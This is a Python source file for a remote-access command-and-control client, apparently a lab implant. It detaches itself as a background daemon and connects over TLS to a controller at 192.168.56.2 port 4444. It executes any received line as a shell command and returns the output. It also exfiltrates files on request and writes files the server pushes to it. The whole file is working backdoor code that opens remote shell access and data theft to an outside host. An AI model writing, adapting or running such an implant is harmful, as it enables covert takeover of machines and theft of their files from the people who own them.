# ======================== IMPORTS ========================
import os
import socket
import subprocess
import sys
import time
import ssl 

# ======================== CONSTANTS ========================
CHUNK_SIZE = 262144  # 256 KB
PID_FILE = "/tmp/c2client.pid"

# ======================== NETWORK HELPERS ========================
def client_recv_line(sock: socket.socket) -> str | None:
    # --------- Line Receiver ---------
    data = b""
    while True:
        chunk = sock.recv(1)
        if not chunk:
            return None if not data else data.decode("utf-8", errors="ignore")
        if chunk == b"\n":
            break
        data += chunk
    return data.decode("utf-8", errors="ignore")

def client_recv_exact(sock: socket.socket, size: int) -> bytes:
    # --------- Exact Byte Receiver ---------
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(min(CHUNK_SIZE, size - len(data)))
        if not chunk:
            raise ConnectionError("Connection closed while receiving file data")
        data += chunk
    return bytes(data)

# ======================== FILE TRANSFER ========================
def client_receive_file(sock: socket.socket):
    # --------- File Receiver ---------
    header = client_recv_line(sock)
    if header is None:
        print("[!] No header received.")
        return

    parts = header.strip().split()
    if len(parts) != 3 or parts[0] != "FILE":
        print(f"[!] Unexpected header: {header!r}")
        return

    _, filename, size_str = parts
    size = int(size_str)
    print(f"[*] Receiving file: {filename} ({size} bytes)")

    with open(filename, "wb") as f:
        remaining = size
        while remaining > 0:
            chunk = sock.recv(min(CHUNK_SIZE, remaining))
            if not chunk:
                raise ConnectionError("Connection closed while receiving file data")
            f.write(chunk)
            remaining -= len(chunk)
            print(f"    ...{size - remaining} / {size} bytes", end="\r")

    print(f"\n[+] File received and saved as: {filename}")
    sock.sendall(b"RECVOK\n")

def client_send_file(sock: socket.socket, filename: str):
    # --------- File Sender ---------
    if not os.path.isfile(filename):
        sock.sendall(f"[!] File not found: {filename}\n".encode())
        return

    size = os.path.getsize(filename)
    sock.sendall(f"FILE {os.path.basename(filename)} {size}\n".encode())
    print(f"[*] Sending FILE {filename} {size}")
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            sock.sendall(chunk)

    sock.sendall(b"RECVOK\n")

# ======================== DAEMON HANDLING ========================
def daemonize():
    # --------- Daemonization ---------
    try:
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)

        sys.stdout.flush()
        sys.stderr.flush()
        with open('/dev/null', 'rb', 0) as dev_null:
            os.dup2(dev_null.fileno(), sys.stdin.fileno())
        with open('/dev/null', 'ab', 0) as dev_null:
            os.dup2(dev_null.fileno(), sys.stdout.fileno())
            os.dup2(dev_null.fileno(), sys.stderr.fileno())

        os.chdir('/')
        os.umask(0)

    except OSError as e:
        print(f"[!] Daemonize failed: {e}")
        sys.exit(1)

def write_pid():
    # --------- PID File Creation ---------
    if os.path.exists(PID_FILE):
        print("[!] Already running?")
        sys.exit(1)
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))
#========================= TLS CONTEXT ================================
def build_tls_context():
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.load_verify_locations("server.crt")
    ctx.check_hostname = False
    return ctx

TLS_CONTEXT = build_tls_context()
# ======================== MAIN CONNECTION LOOP ========================
def connect_to_server():
    # --------- Connection and Command Handling ---------
    while True:
        client = None
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.connect(('192.168.56.2', 4444))

            client = TLS_CONTEXT.wrap_socket(raw, server_hostname='C2Server')
            print("[*] Connected to server.")

            try:
                subprocess.Popen(['xterm', '-e', 'echo Hello && bash'])
            except Exception as e:
                print(f"[!] Could not open terminal: {e}")

            while True:
                command = client_recv_line(client)
                if command is None:
                    break

                print("\n------------- Command Execution -------------")
                print(f"[CLIENT] Received Command: {command}")

                if command.startswith("FILE "):
                    client_receive_file(client)
                    continue
                elif command.startswith("PULL "):
                    filename = command[5:].strip()
                    client_send_file(client, filename)
                    continue
                elif command.startswith("cd "):
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        client.sendall(f"Changed directory to {os.getcwd()}\n".encode())
                    except Exception as e:
                        client.sendall(f"cd error: {e}\n".encode())
                    continue

                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output.strip():
                    output = "[*] Command executed. No output.\n"
                client.sendall(output.encode("utf-8"))

        except Exception as e:
            print(f"[!] Connection error: {e}")
            time.sleep(5)
        finally:
            if client is not None:
                 try:
                     client.close()
                 except:
                     pass

# ======================== ENTRY POINT ========================
if __name__ == "__main__":
    daemonize()
    write_pid()
    connect_to_server()
